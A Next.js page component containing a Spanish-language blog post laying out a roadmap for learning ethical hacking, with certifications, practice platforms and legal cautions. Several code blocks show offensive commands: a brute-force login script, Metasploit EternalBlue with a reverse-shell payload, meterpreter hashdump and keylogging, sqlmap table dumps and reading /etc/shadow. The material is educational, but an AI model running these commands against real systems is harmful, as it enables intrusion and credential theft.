"use client";

import BlogPost from "@/components/BlogPost";

export default function EthicalHackingRoadmap() {
  return (
    <BlogPost
      title="Roadmap Completo de Hacking Ético 2025"
      category="Ciberseguridad"
      author="System 777"
      date="2025-01-03"
      readTime="18 min"
      content={`
## Introducción

El hacking ético es la práctica de probar sistemas de información con permiso del propietario para identificar vulnerabilidades antes de que los atacantes maliciosos las exploten. En 2025, con el aumento de amenazas cibernéticas, la demanda de profesionales de ciberseguridad crece exponencialmente.

Este roadmap te guía paso a paso desde los fundamentos hasta la especialización, proporcionando las bases necesarias para construir una carrera en hacking ético.

## Fase 1: Fundamentos (3-6 meses)

### Redes y Protocolos

Entender cómo funcionan las redes es el pilar fundamental del hacking ético. Sin este conocimiento, no podrás comprender cómo los atacantes mueven datos por la red.

\`\`\`
Conceptos clave a dominar:
├── Modelo OSI (7 capas)
│   ├── Capa 1: Física (cables, switches)
│   ├── Capa 2: Enlace de datos (MAC, Ethernet)
│   ├── Capa 3: Red (IP, routing, ICMP)
│   ├── Capa 4: Transporte (TCP, UDP, puertos)
│   ├── Capa 5: Sesión
│   ├── Capa 6: Presentación (SSL/TLS)
│   └── Capa 7: Aplicación (HTTP, DNS, FTP)
├── Protocolos esenciales
│   ├── TCP/IP y UDP
│   ├── HTTP/HTTPS
│   ├── DNS
│   ├── DHCP
│   ├── ARP
│   ├── SSH y Telnet
│   └── FTP y SFTP
└── Herramientas de red
    ├── Wireshark (análisis de tráfico)
    ├── tcpdump (captura de paquetes)
    ├── Nmap (escaneo de redes)
    └── Netcat (herramienta Swiss Army)
\`\`\`

**Práctica con Nmap:**

\`\`\`bash
# Escaneo básico de un host
nmap 192.168.1.1

# Escaneo detallado con detección de servicios
nmap -sV -sC -O 192.168.1.1

# Escaneo de toda la red
nmap -sn 192.168.1.0/24

# Escaneo de puertos específicos
nmap -p 21,22,80,443,8080 192.168.1.1

# Escaneo sigiloso (SYN scan)
nmap -sS -T4 192.168.1.1

# Detección de scripts de vulnerabilidades
nmap --script vuln 192.168.1.1

# Output a archivo para análisis posterior
nmap -oA resultados_escaneo 192.168.1.1
\`\`\`

**Práctica con Wireshark:**

\`\`\`
1. Captura de tráfico:
   - Selecciona tu interfaz de red
   - Haz clic en "Start Capturing"
   - Aplica filtros para ver tráfico específico

2. Filtros útiles:
   - http → Solo tráfico HTTP
   - tcp.port == 443 → Solo tráfico HTTPS
   - ip.addr == 192.168.1.100 → Tráfico de un host específico
   - dns → Solo tráfico DNS
   - tcp.flags.syn == 1 → Solo paquetes SYN (inicios de conexión)

3. Análisis:
   - Sigue los streams TCP para ver conversaciones completas
   - Exporta archivos transferidos
   - Identifica patrones de comportamiento sospechoso
\`\`\`

### Linux

Linux es el sistema operativo preferido para ciberseguridad. La mayoría de las herramientas de hacking están diseñadas para Linux.

\`\`\`bash
# Comandos esenciales de Linux para ciberseguridad

# Exploración del sistema
whoami              # Usuario actual
id                  # Información del usuario y grupos
uname -a            # Información del sistema
cat /etc/passwd     # Usuarios del sistema
cat /etc/shadow     # Contraseñas hasheadas (requiere root)
find / -perm -4000 2>/dev/null  # Binarios con SUID

# Red
ifconfig            # Interfaces de red
netstat -tlnp       # Puertos abiertos
ss -tlnp            # Alternativa moderna a netstat
arp -a              # Tabla ARP
iptables -L         # Reglas de firewall

# Procesos y servicios
ps aux              # Todos los procesos
top                 # Monitor de procesos
systemctl status *  # Estado de servicios

# Archivos y permisos
chmod 777 archivo   # Permisos completos (¡inseguro!)
chown root:root archivo  # Cambiar propietario
find / -name "*.conf" 2>/dev/null  # Buscar archivos de configuración
\`\`\`

### Programación

Al menos un lenguaje de programación es esencial para hacking ético.

\`\`\`python
# Python para Ciberseguridad - Ejemplos prácticos

# 1. Scanner de puertos básico
import socket
import threading

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0

def port_scanner(host, start_port, end_port):
    print(f"Escaneando {host}...")
    open_ports = []
    for port in range(start_port, end_port + 1):
        if scan_port(host, port):
            open_ports.append(port)
            print(f"Puerto {port} ABIERTO")
    return open_ports

# Uso
open_ports = port_scanner("192.168.1.1", 1, 1024)
print(f"Puertos abiertos: {open_ports}")

# 2. Sniffer de red simple
from scapy.all import sniff, IP, TCP

def packet_callback(packet):
    if packet.haslayer(IP):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        if packet.haslayer(TCP):
            tcp_sport = packet[TCP].sport
            tcp_dport = packet[TCP].dport
            print(f"[TCP] {ip_src}:{tcp_sport} → {ip_dst}:{tcp_dport}")

sniff(filter="tcp", prn=packet_callback, count=100)

# 3. Fuerza bruta simple
import requests
import itertools

def brute_force_login(url, username, password_list):
    for password in password_list:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if "Welcome" in response.text:
            print(f"[+] Contraseña encontrada: {password}")
            return password
        print(f"[-] Intento fallido: {password}")
    return None
\`\`\`

**Lenguajes recomendados:**
- **Python**: Automatización, scripting, análisis de datos
- **Bash**: Scripts de shell, automatización en Linux
- **JavaScript**: Hacking web, análisis de frontends
- **SQL**: Inyección SQL, análisis de bases de datos
- **C/C++**: Análisis de vulnerabilidades a nivel de memoria

## Fase 2: Seguridad Básica (3-4 meses)

### OWASP Top 10

El OWASP Top 10 es la lista de las vulnerabilidades web más críticas. Debes conocer cada una:

\`\`\`
OWASP Top 10 - 2021:
1. Broken Access Control → Control de acceso roto
2. Cryptographic Failures → Fallos de criptografía
3. Injection → Inyección (SQL, NoSQL, OS, LDAP)
4. Insecure Design → Diseño inseguro
5. Security Misconfiguration → Mala configuración de seguridad
6. Vulnerable and Outdated Components → Componentes vulnerables
7. Identification and Authentication Failures → Fallos de identificación
8. Software and Data Integrity Failures → Fallos de integridad
9. Security Logging and Monitoring Failures → Fallos de monitoreo
10. Server-Side Request Forgery (SSRF) → Falsificación de solicitudes del lado del servidor
\`\`\`

### Herramientas de Hacking Ético

\`\`\`
Herramientas esenciales:
├── Recolección de información
│   ├── Nmap → Escaneo de redes y puertos
│   ├── Recon-ng → Framework de reconocimiento
│   ├── theHarvester → Recolección de emails y subdominios
│   └── Shodan → Motor de búsqueda de dispositivos IoT
├── Explotación
│   ├── Metasploit Framework → Framework de explotación
│   ├── Burp Suite → Testing de aplicaciones web
│   ├── SQLMap → Automatización de inyección SQL
│   └── John the Ripper → Cracking de contraseñas
├── Wireless
│   ├── Aircrack-ng → Suite de auditoría WiFi
│   ├── Wifite → Automatización de auditoría WiFi
│   └── Kismet → Detección de redes inalámbricas
├── Post-explotación
│   ├── Mimikatz → Extracción de credenciales
│   ├── LinPEAS/WinPEAS → Enumeración de privilegios
│   └── BloodHound → Análisis de Active Directory
└── Análisis
    ├── Wireshark → Análisis de tráfico de red
    ├── Ghidra → Ingeniería inversa
    └── Volatility → Análisis de memoria
\`\`\`

\`\`\`bash
# Instalación de herramientas en Kali Linux (ya viene preinstalado)
# Si usas otra distribución:

# Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# SQLMap
sudo apt install sqlmap

# Burp Suite
# Descargar desde portswigger.net

# John the Ripper
sudo apt install john

# Aircrack-ng
sudo apt install aircrack-ng
\`\`\`

### Metasploit Framework

\`\`\`bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search eternalblue
search type:exploit platform:windows smb

# Usar un exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar parámetros
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ejecutar exploit
exploit

# Comandos de Meterpreter
sysinfo          # Información del sistema
getuid           # Usuario actual
getsystem        # Intentar escalar privilegios
hashdump         # Dump de hashes de contraseñas
screenshot       # Captura de pantalla
keyscan_start    # Iniciar keylogger
upload archivo   # Subir archivo al sistema
download archivo # Descargar archivo del sistema
\`\`\`

## Fase 3: Hacking Ético Práctico (4-6 meses)

### Reconocimiento

\`\`\`bash
# Recolección de información pasiva
# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
intitle:"index of" "parent directory"

# WHOIS
whois target.com

# DNS Enumeration
dnsrecon -d target.com -t std
dig target.com ANY

# Subdomain Enumeration
subfinder -d target.com
amass enum -passive -d target.com

# Shodan
shodan search "org:Target port:22"
\`\`\`

### Explotación

\`\`\`bash
# Metasploit - Explotación de servicio vulnerable
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit

# SQLMap - Inyección SQL
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Burp Suite - Proxy y análisis de tráfico web
# 1. Configurar navegador para usar proxy 127.0.0.1:8080
# 2. Interceptar peticiones
# 3. Modificar parámetros
# 4. Reenviar peticiones manipuladas
\`\`\`

### Post-Explotación

\`\`\`bash
# Enumeración de privilegios
linpeas.sh    # Linux
winpeas.exe   # Windows

# Escalada de privilegios
# Linux
find / -perm -u=s -type f 2>/dev/null    # Buscar SUID binaries
sudo -l                                    # Permisos de sudo
cat /etc/crontab                          # Cron jobs

# Windows
whoami /all                                # Información completa del usuario
net localgroup administrators              # Miembros del grupo admin
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  # Politicas
\`\`\`

## Fase 4: Certificaciones (6-12 meses)

### CompTIA Security+

- **Nivel**: Fundacional
- **Enfoque**: Seguridad general, redes, amenazas
- **Requisito**: No hay prerrequisitos formales
- **Costo**: ~$400 USD
- **Preparación**: 2-3 meses de estudio

### CEH (Certified Ethical Hacker)

- **Nivel**: Intermedio
- **Enfoque**: Metodologías de hacking, herramientas
- **Requisito**: 2 años de experiencia en seguridad o formación oficial
- **Costo**: ~$1,199 USD (examen)
- **Preparación**: 3-4 meses

### OSCP (Offensive Security Certified Professional)

- **Nivel**: Avanzado
- **Enfoque**: Hacking práctico, laboratorio de 24 horas
- **Requisito**: Experiencia práctica recomendada
- **Costo**: ~$1,599 USD (curso + examen)
- **Preparación**: 6-12 meses

**Preparación para OSCP:**

\`\`\`
1. Completar el curso PWK (Penetration Testing with Kali Linux)
2. Practicar en el laboratorio (mínimo 30 máquinas)
3. Resolver máquinas en TryHackMe y HackTheBox
4. Documentar todo con screenshots y notas
5. Practicar con el formato de examen (24 horas, 5 máquinas)
\`\`\`

### Otras certificaciones valoradas

- **CompTIA PenTest+**: Hacking y penetración
- **GIAC GPEN**: Pentesting empresarial
- **OSWE**: Web Application Security Expert
- **CRTP**: Certified Red Team Professional (Active Directory)

## Fase 5: Especialización (continua)

### Áreas de especialización

\`\`\`
Especializaciones en ciberseguridad:
├── Pentesting Web → Aplicaciones web y APIs
├── Pentesting Mobile → Apps Android e iOS
├── Red Team → Simulación de ataques avanzados
├── Blue Team → Defensa y respuesta a incidentes
├── Purple Team → Combinación de Red y Blue Team
├── Bug Bounty → Programas de recompensas
├── Cloud Security → AWS, Azure, GCP
├── IoT Security → Dispositivos conectados
├── Malware Analysis → Análisis de software malicioso
├── Forensics → Análisis forense digital
└── Social Engineering → Ingeniería social
\`\`\`

### Plataformas de práctica

\`\`\`
Plataformas recomendadas:
├── TryHackMe → Ideal para principiantes
├── HackTheBox → Máquinas y desafíos
├── VulnHub → VMs vulnerables para descargar
├── PortSwigger Web Security Academy → Hacking web gratuito
├── OverTheWire → Wargames de Linux
├── PicoCTF → Competencias CTF
└── PentesterLab → Ejercicios prácticos
\`\`\`

### Bug Bounty Programs

\`\`\`
Programas de Bug Bounty populares:
├── HackerOne → hackerone.com
├── Bugcrowd → bugcrowd.com
├── Synack → synack.com
├── Intigriti → intigriti.com
└── Programas propios de empresas (Google, Microsoft, Apple)
\`\`\`

## Recursos Recomendados

### Libros

- **"The Web Application Hacker's Handbook"** - Dafydd Stuttard y Marcus Pinto
- **"Hacking: The Art of Exploitation"** - Jon Erickson
- **"Metasploit: The Penetration Tester's Guide"** - David Kennedy et al.
- **"Black Hat Python"** - Justin Seitz
- **"Penetration Testing"** - Georgia Weidman

### Cursos en línea

- **TryHackMe** - Ruta "Complete Beginner" y "Jr Penetration Tester"
- **HackTheBox Academy** - Cursos estructurados de hacking
- **INE** - Cursos de ciberseguridad profesionales
- **Udemy** - Cursos específicos de herramientas

### Canales de YouTube

- **IppSec** - Resolución de máquinas HackTheBox
- **NetworkChuck** - Tutoriales de redes y hacking
- **The Cyber Mentor** - Hacking ético y OSCP
- **John Hammond** - CTFs y análisis de malware

## Ética y Legalidad

### Reglas del Hacking Ético

1. **Permiso explícito**: Siempre obtén autorización por escrito antes de probar cualquier sistema.
2. **Alcance definido**: Respeta los límites del alcance acordado.
3. **No causar daño**: Tu objetivo es encontrar vulnerabilidades, no causar daño.
4. **Confidencialidad**: Mantén la información de las vulnerabilidades encontradas en secreto.
5. **Reporte completo**: Documenta todo y presenta un reporte profesional.
6. **Mejora continua**: Usa tus hallazgos para mejorar la seguridad del cliente.

### Marco legal

- **CFAA (EE.UU.)**: Computer Fraud and Abuse Act
- **LOPD (España)**: Ley Orgánica de Protección de Datos
- **RGPD (UE)**: Reglamento General de Protección de Datos
- **Ley 24/2007 (España)**: Ley General de Telecomunicaciones

\`\`\`
⚠️ IMPORTANTE:
- El hacking sin autorización es ILEGAL en la mayoría de países.
- Las penas pueden incluir prisión y multas significativas.
- Siempre actúa de manera ética y legal.
- Documenta tu autorización antes de cualquier prueba.
\`\`\`

## Cronograma de Estudio Sugerido

\`\`\`
Mes 1-3: Fundamentos
├── Semana 1-4: Redes (CCNA o equivalentes)
├── Semana 5-8: Linux (Linux+, LPIC-1)
├── Semana 9-12: Programación (Python básico)

Mes 4-6: Seguridad Básica
├── Semana 1-4: OWASP Top 10 y herramientas web
├── Semana 5-8: Metasploit y herramientas de explotación
├── Semana 9-12: Laboratorio práctico

Mes 7-12: Especialización
├── Mes 7-8: Pentesting Web (Burp Suite, OWASP ZAP)
├── Mes 9-10: Preparación de certificación
├── Mes 11-12: Bug Bounty y CTFs

Año 2+: Experiencia y certificaciones
├── OSCP o equivalente
├── Bug Bounty activo
├── Contribución a la comunidad
\`\`\`

## Conclusión

El camino del hacking ético es largo pero increíblemente gratificante. La ciberseguridad es uno de los campos con mayor crecimiento y demanda laboral. La clave del éxito es la constancia, la práctica regular y el compromiso ético.

Recuerda: el conocimiento de seguridad es poder, y con poder viene responsabilidad. Usa tus habilidades para proteger, no para atacar. El mundo necesita más defensores de la ciberseguridad.

¡Empieza hoy, mantente curioso y nunca dejes de aprender!
      `}
    />
  );
}
